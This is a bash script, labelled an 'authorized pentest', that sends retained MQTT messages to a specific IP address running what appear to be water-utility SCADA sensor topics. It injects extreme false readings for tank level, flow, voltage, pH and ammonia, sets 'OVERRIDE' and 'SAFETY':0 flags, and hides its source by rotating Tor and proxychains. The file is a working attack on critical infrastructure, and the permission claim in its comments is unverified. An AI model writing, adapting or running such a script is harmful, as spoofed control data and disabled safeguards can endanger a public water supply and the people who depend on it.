#!/bin/bash
# ☢️ TRUSTEDF57 EVN PENTEST v3.4 - TARGETED CONTROL - NO FLOOD
# ✅ AUTHORIZED PENTEST - PERMISSION CONFIRMED - PRECISE VALUE CONTROL

HOST="113.190.40.241"
PORT=1883
PROXIES=("torsocks" "torsocks -i" "proxychains4 -q")

# VALORI REALI SCADA IDRICHE - PRECISIONE CHIRURGICA
SCADA_VALUES=(
    "LEVEL:99999.99"      # Livello serbatoio CRITICO
    "LUULUONG:9999999.99" # Flusso MASSIMO  
    "VOLT:999.99"         # Tensione FUORI LIMITE
    "CUR:999.99"          # Corrente MAX
    "F:999.99"            # Frequenza anomalia
    "Pow:999999.99"       # Potenza overload
    "pH:14.00"            # pH DISTRUTTIVO
    "NH4:99999.99"        # Ammoniaca letale
    "TDS:999999.99"       # Solidi disciolti estremi
    "Temperature:999.99"  # Sovratemperatura
)

# TOPIC REALI SCADA IDRICHE (dal log)
SCADA_TOPICS=(
    "LEVEL" "LUULUONG" "VOLT" "CUR" "F" "Pow" 
    "Temperature" "pH" "TDS" "NH4"
    "QUAN_TRAC/LEVEL" "QUAN_TRAC/LUULUONG" "QUAN_TRAC/VOLT"
    "MUCNUOC/LEVEL" "SCADA/VALUES/#" "IDRICHE/SENSORS/#"
)

set -euo pipefail

torsocks_cmd() {
    local cmd="$1"; shift
    local idx=$((RANDOM % ${#PROXIES[@]}))
    local proxy="${PROXIES[$idx]}"
    printf "🔄 %s → %s %s\n" "$proxy" "$cmd" "$*"
    $proxy "$cmd" "$@" >/dev/null 2>&1 || true
}

scada_payload_single() {
    local topic="$1"
    local payload="{"
    for val in "${SCADA_VALUES[@]}"; do
        local k=$(echo "$val" | cut -d: -f1)
        local v=$(echo "$val" | cut -d: -f2)
        payload+="\"$k\":$v,"
    done
    echo "${payload%,},\"OVERRIDE\":1,\"SAFETY\":0,\"CONTROL\":true}"
}

# ==================== CONTROLLO PRECISO ====================
precise_control() {
    echo "🎯 PENTEST CONTROL - SINGLE SHOT PER TOPIC"
    echo "📊 Baseline check..."
    torsocks mosquitto_sub -h "$HOST" -p "$PORT" -t '#' -v | head -20
    
    for topic in "${SCADA_TOPICS[@]}"; do
        local payload=$(scada_payload_single "$topic")
        echo "📤 SET $topic → MAX VALUES"
        torsocks_cmd "mosquitto_pub" -h "$HOST" -p "$PORT" -t "$topic" -m "$payload" -q 1 -r
        sleep 1
    done
    
    echo "✅ VALUES SET - Verifica..."
    sleep 3
    torsocks mosquitto_sub -h "$HOST" -p "$PORT" -t '#' -v | grep -E "$(printf "%s|" "${SCADA_VALUES[@]%%:*}")" | head -10
}

# ==================== EMERGENZA RAPIDA ====================
emergency_values() {
    echo "🚨 EMERGENCY MAX VALUES - ONE SHOT"
    torsocks_cmd "mosquitto_pub" -h "$HOST" -p "$PORT" -t "LEVEL" -m "99999.99" -r
    torsocks_cmd "mosquitto_pub" -h "$HOST" -p "$PORT" -t "LUULUONG" -m "9999999.99" -r
    torsocks_cmd "mosquitto_pub" -h "$HOST" -p "$PORT" -t "VOLT" -m "999.99" -r
    torsocks_cmd "mosquitto_pub" -h "$HOST" -p "$PORT" -t "CUR" -m "999.99" -r
    torsocks_cmd "mosquitto_pub" -h "$HOST" -p "$PORT" -t "pH" -m "14.00" -r
    echo "✅ EMERGENCY SET - Check: mosquitto_sub -t '#'"
}

# ==================== MAIN PENTEST ====================
echo "🔬 TRUSTEDF57 PENTEST v3.4 - PRECISE SCADA CONTROL"
echo "1) Precise control tutti i topic reali"
echo "2) Emergency max values rapidi" 
echo "3) Test payload singolo"
read -r choice

case "${choice:-0}" in
    1) precise_control ;;
    2) emergency_values ;;
    3) 
        echo "🧪 Sample payload LEVEL:"
        scada_payload_single "LEVEL"
        ;;
    *) echo "❌ Scegli 1,2,3";;
esac

echo "✅ PENTEST COMPLETE - Valori cambiati con torsocks rotation"
echo "🔍 Verifica: torsocks mosquitto_sub -h $HOST -p $PORT -t '#' -v"
